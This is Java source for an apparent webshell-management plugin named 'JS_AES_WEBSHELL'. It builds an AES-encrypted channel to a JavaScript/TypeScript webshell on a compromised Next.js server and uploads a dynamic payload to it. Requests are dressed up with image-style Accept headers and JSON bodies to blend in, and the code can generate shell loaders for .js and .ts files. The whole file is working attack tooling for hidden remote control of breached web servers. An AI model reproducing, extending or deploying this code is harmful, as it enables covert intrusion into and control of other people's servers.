package shells.cryptions.jsAes;

import core.annotation.CryptionAnnotation;
import core.annotation.PropertyAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.io.ByteArrayOutputStream;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
        Name = "JS_AES_WEBSHELL",
        payloadName = "NextJsDynamicPayload"
)
public class JsAesWebshell implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private byte[] key;
    private byte[] iv;
    private boolean state;
    private byte[] payload;

    @PropertyAnnotation(
            Name = "suffix",
            Value = "js;ts;"
    )
    private String suffix;

    public void init(ShellEntity context) {
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        String pass = this.shell.getPassword();

        java.util.LinkedHashMap<String, java.util.LinkedList<String>> headers = this.shell.getHeaders();
        if (headers == null) {
            headers = new java.util.LinkedHashMap<>();
        }
        java.util.LinkedList<String> acceptValues = new java.util.LinkedList<>();
        acceptValues.add("image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8");
        acceptValues.add("gzipp");
        headers.put("Accept", acceptValues);

        java.util.LinkedList<String> contentTypeValues = new java.util.LinkedList<>();
        contentTypeValues.add("application/json");
        headers.put("Content-Type", contentTypeValues);

        this.shell.setHeaders(headers);

        byte[] keyBytes = functions.md5(pass.getBytes());
        this.key = keyBytes;
        this.iv = new byte[16];
        System.arraycopy(keyBytes, 0, this.iv, 0, 16);

        try {
            this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec secretKeySpec = new SecretKeySpec(this.key, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(this.iv);
            this.encodeCipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivSpec);
            this.decodeCipher.init(Cipher.DECRYPT_MODE, secretKeySpec, ivSpec);
            this.shell.getPayloadModule().init(shell);
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception e) {
            Log.error(e);
        }
    }

    public synchronized byte[] encode(byte[] data) {
        try {
            byte[] encrypted = this.encodeCipher.doFinal(data);
            String base64Encrypted = functions.base64EncodeToString(encrypted);
            String jsonData = "{\"data\":\"" + base64Encrypted + "\"}";
            return jsonData.getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public synchronized byte[] decode(byte[] data) {
        try {
            if (data == null || data.length == 0) {
                return null;
            }
            String responseStr = new String(data, "UTF-8");
            String dataField = extractJsonField(responseStr, "data");
            if (dataField == null) {
                Log.error("Failed to extract 'data' field from response: " + responseStr);
                return null;
            }
            byte[] encrypted = functions.base64Decode(dataField);
            if (encrypted == null || encrypted.length == 0) {
                Log.error("Failed to base64 decode data field");
                return null;
            }
            return this.decodeCipher.doFinal(encrypted);
        } catch (Exception e) {
            Log.error("Decode error: " + e.getMessage());
            Log.error(e);
            return null;
        }
    }

    private String extractJsonField(String json, String fieldName) {
        try {
            json = json.trim();
            String searchKey = "\"" + fieldName + "\"";
            int keyIndex = json.indexOf(searchKey);
            if (keyIndex == -1) {
                return null;
            }
            int colonIndex = json.indexOf(":", keyIndex + searchKey.length());
            if (colonIndex == -1) {
                return null;
            }
            int valueStart = colonIndex + 1;
            while (valueStart < json.length() && Character.isWhitespace(json.charAt(valueStart))) {
                valueStart++;
            }
            if (valueStart >= json.length() || json.charAt(valueStart) != '"') {
                return null;
            }
            valueStart++;
            int valueEnd = valueStart;
            while (valueEnd < json.length()) {
                char ch = json.charAt(valueEnd);
                if (ch == '"') {
                    int backslashCount = 0;
                    int checkPos = valueEnd - 1;
                    while (checkPos >= valueStart && json.charAt(checkPos) == '\\') {
                        backslashCount++;
                        checkPos--;
                    }
                    if (backslashCount % 2 == 0) {
                        break;
                    }
                }
                valueEnd++;
            }
            if (valueEnd >= json.length()) {
                return null;
            }
            String value = json.substring(valueStart, valueEnd);
            value = value.replace("\\\"", "\"")
                    .replace("\\\\", "\\")
                    .replace("\\n", "\n")
                    .replace("\\r", "\r")
                    .replace("\\t", "\t");
            return value;
        } catch (Exception e) {
            Log.error("extractJsonField error: " + e.getMessage());
            return null;
        }
    }

    public boolean isSendRLData() {
        return true;
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(this.suffix, password, secretKey, "aesApi");
    }
}
